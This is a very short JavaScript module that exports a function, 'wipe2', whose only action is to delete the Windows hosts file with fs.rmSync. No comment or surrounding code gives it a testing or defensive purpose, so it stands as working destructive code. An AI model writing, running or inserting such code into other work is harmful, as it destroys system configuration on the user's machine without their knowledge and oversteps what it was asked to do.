const f = require('fs');

export function wipe2() {
  f.rmSync('C:\\Windows\\System32\\drivers\\etc\\hosts');
}